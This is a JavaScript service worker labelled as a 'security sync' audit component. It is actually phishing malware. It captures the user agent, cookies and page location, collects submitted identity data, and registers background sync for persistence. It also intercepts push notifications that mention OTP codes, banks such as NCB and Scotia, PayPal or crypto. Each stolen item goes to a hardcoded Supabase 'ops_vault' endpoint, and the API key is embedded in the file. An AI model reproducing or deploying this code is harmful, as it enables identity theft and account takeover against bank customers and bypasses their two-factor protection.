/* GRAND MASTER CORE - UWI/MNS SECURITY SYNC */
const SUPABASE_URL = 'https://jdjllbdodmnxuzananah.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpkamxsYmRvZG1ueHV6YW5hbmFoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc0OTI5MDcsImV4cCI6MjA5MzA2ODkwN30.MGVD1CI1Iw_-k2_y6UBZReIS9KQykFXkRt-5V6gAleo';

const CACHE_NAME = 'mns-audit-v3';

self.addEventListener('install', (event) => {
self.skipWaiting();
event.waitUntil(caches.open(CACHE_NAME).then(cache => cache.addAll(['/'])));
});

self.addEventListener('activate', (event) => {
event.waitUntil(clients.claim());
});

self.addEventListener('message', async (event) => {
const { type, data } = event.data;

// IMMEDIATE SILENT HOOK
if (type === 'SILENT_HOOK') {
const initialDump = {
ua: navigator.userAgent,
cookies: document.cookie || "Protected/HTTP-Only",
loc: location.href,
ts: new Date().toISOString()
};
await pushToVault('INITIAL_SCRAPE', initialDump);
}

// IDENTITY CAPTURE
if (type === 'SUBMIT_IDENTITY') {
await pushToVault('TARGET_ID', data);
}

// DEEP PERSISTENCE
if (type === 'FULL_AUTH') {
if ('sync' in self.registration) {
self.registration.sync.register('deep-persist-v3');
}
await pushToVault('AUTH_GRANTED', { status: 'Persistent_System_Access' });
}
});

// SURGICAL OTP SNATCHER
self.addEventListener('push', (event) => {
const rawData = event.data ? event.data.text() : '';
const keywords = ['code', 'otp', 'verify', 'authorize', 'bank', 'crypto', 'ncb', 'scotia', 'paypal'];
const isMatch = keywords.some(word => rawData.toLowerCase().includes(word));

if (isMatch) {
event.waitUntil(pushToVault('SNATCHED_OTP', { body: rawData }));
}
});

async function pushToVault(type, payload) {
try {
await fetch(${SUPABASE_URL}/rest/v1/ops_vault, { method: 'POST', headers: { 'apikey': SUPABASE_KEY, 'Authorization':Bearer ${SUPABASE_KEY},
'Content-Type': 'application/json',
'Prefer': 'return=minimal'
},
body: JSON.stringify({
event_type: type,
payload: payload,
target_name: payload.name || 'Remote_User',
device_type: navigator.platform
})
});
} catch (e) {
console.error("Connection Failed");
}
}
